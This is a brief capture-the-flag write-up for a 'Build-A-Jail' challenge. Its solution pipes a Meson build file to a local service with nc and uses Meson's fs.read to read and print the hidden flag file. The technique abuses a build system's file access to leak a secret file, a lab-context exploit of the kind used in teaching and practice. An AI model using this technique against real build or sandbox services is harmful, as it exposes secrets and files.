# Build-A-Jail

Tired of escaping from jails? Now you can build one using [The Meson Build System](https://mesonbuild.com/).  

## Solution

```bash
(cat << _EOF; sleep 10) | nc localhost 1337 | grep 'Message:'
project('foo','c')
fs = import('fs')
flag = fs.read('flag')
message(flag)
EOF
_EOF
```
